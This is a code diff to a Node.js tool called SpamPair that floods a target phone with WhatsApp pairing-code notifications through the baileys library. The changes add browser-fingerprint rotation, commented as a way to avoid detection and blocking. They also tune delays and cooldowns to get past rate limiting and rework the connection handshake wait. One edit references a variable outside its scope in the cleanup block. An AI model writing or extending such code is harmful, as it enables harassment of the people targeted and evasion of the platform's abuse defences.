@@ -10,8 +10,16 @@ const EventEmitter = require('events');
 
 // ---------- CONFIGURATION ----------
 const DEFAULT_DURATION_HOURS = 24;
-const REQUEST_DELAY_MIN_MS = 1200;
-const REQUEST_DELAY_MAX_MS = 3000;
+const REQUEST_DELAY_MIN_MS = 10000;
+const REQUEST_DELAY_MAX_MS = 16000;
+// Browser fingerprints to rotate between (avoids fingerprint-based blocking)
+const SPAM_BROWSERS = [
+  ['Ubuntu', 'Chrome'],
+  ['Windows', 'Chrome'],
+  ['Mac OS', 'Safari'],
+  ['Windows', 'Edge'],
+  ['Android', 'Chrome'],
+];
 
 // ---------- STATE ----------
 const activeCampaigns = new Map(); // phone -> { spamPair, stopFlag, stats, startTime }
@@ -64,8 +72,14 @@ class SpamPair extends EventEmitter {
   // ---------- CORE ATTEMPT — uses baileys WebSocket to trigger real pairing notification ----------
   async _attemptLink() {
     let sock = null;
+    let connTimer = null;
     try {
       const { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();
+
+      // Rotate browser fingerprint to avoid detection
+      const _bIdx = (this.stats.attempts || 0) % SPAM_BROWSERS.length;
+      const _bCfg = SPAM_BROWSERS[_bIdx];
+      const _browser = Browsers[_bCfg[1]]?.(_bCfg[0]) || Browsers.ubuntu('Chrome');
 
       // Create ephemeral in-memory auth credentials
       const authCreds = initAuthCreds();
@@ -76,10 +90,22 @@ class SpamPair extends EventEmitter {
 
       const { version } = await fetchLatestBaileysVersion();
 
+      // Promise that resolves when noise handshake completes OR rejects on error/disconnect
+      let _connected = false;
+      let _connErr = null;
+      const _onConnUpdate = (update) => {
+        if (update.connection === 'open') {
+          _connected = true;
+        }
+        if (update.lastDisconnect?.error) {
+          _connErr = update.lastDisconnect.error;
+        }
+      };
+
       // Create socket — baileys handles WebSocket connect + noise handshake internally
       sock = makeWASocket({
         version,
-        browser: this._browser || Browsers.ubuntu('Chrome'),
+        browser: _browser,
         auth: {
           creds: state.creds,
           keys: state.keys
@@ -87,20 +113,25 @@ class SpamPair extends EventEmitter {
         generateHighQualityLinkPreview: false,
         shouldSyncHistoryMessage: () => false,
         getMessage: async () => undefined,
-        connectTimeoutMs: 12000,
-        defaultQueryTimeoutMs: 12000,
+        connectTimeoutMs: 15000,
+        defaultQueryTimeoutMs: 15000,
         logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
       });
 
-      // Wait 4 seconds for WebSocket connect + noise handshake (same approach as pair.js)
-      // Important: 'connection:open' only fires after CB:success (authenticated login),
-      // which never comes for fresh unregistered sockets. So we use a fixed delay.
-      await this._sleep(4000);
+      sock.ev.on('connection.update', _onConnUpdate);
 
-      // Check if the socket's WebSocket is actually connected
-      if (!sock.ws || !sock.ws.isOpen) {
-        throw new Error('WebSocket not connected after 4s');
+      // Wait for noise handshake (up to 18s) — unlike the comment in the old code,
+      // 'connection:open' DOES fire for unregistered sockets once noise handshake completes.
+      // The old 4s fixed wait + ws.isOpen was insufficient.
+      const _waitStart = Date.now();
+      while (!_connected && !_connErr && (Date.now() - _waitStart) < 18000) {
+        await this._sleep(500);
       }
+      if (_connErr) throw _connErr;
+      if (!_connected) throw new Error(`Noise handshake not completed after 18s`);
+
+      // Small extra pause after connection:open so initial server stanzas can arrive
+      await this._sleep(1500);
 
       // Request pairing code — this sends the actual WhatsApp XML stanza
       // that triggers a push notification to the target phone
@@ -114,20 +145,23 @@ class SpamPair extends EventEmitter {
     } catch (error) {
       this.stats.attempts++;
       this.stats.errors++;
-      const errMsg = String(error?.message || error || 'Unknown').slice(0, 120);
+      const errMsg = String(error?.message || error || 'Unknown').slice(0, 200);
 
-      // Rate limiting detection
+      // Emit detailed error so the user can see what's failing
+      this.emit('error', { phone: this.phone, error: errMsg });
+
+      // Rate limiting detection — longer cooldown
       if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
         this.emit('rate-limit', { phone: this.phone, detail: errMsg });
-        await this._sleep(10000);
-      } else if (errMsg.includes('WebSocket not connected') || errMsg.includes('connect')) {
-        // Connection issues — wait longer
-        await this._sleep(6000);
+        await this._sleep(30000);
+      } else if (errMsg.includes('not connected') || errMsg.includes('connect') || errMsg.includes('handshake')) {
+        await this._sleep(12000);
       }
 
       return false;
     } finally {
       if (sock) {
+        try { sock.ev?.off('connection.update', _onConnUpdate); } catch (_) {}
         try { sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
       }
     }
